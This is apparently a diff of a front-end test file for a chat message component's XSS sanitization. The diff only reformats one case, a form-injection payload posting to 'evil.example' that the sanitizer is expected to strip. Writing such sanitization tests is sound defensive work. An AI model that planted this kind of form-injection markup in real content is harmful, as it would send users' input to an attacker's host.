@@ -187,7 +187,8 @@ describe('MessageBubble XSS site matrix', () => {
     },
     {
       name: 'form injection markup is stripped',
-      markdown: '<form action="https://evil.example"><input name="q" value="steal" /></form>Review body',
+      markdown:
+        '<form action="https://evil.example"><input name="q" value="steal" /></form>Review body',
       verify: (container) => {
         expect(container).toHaveTextContent('Review body');
       },
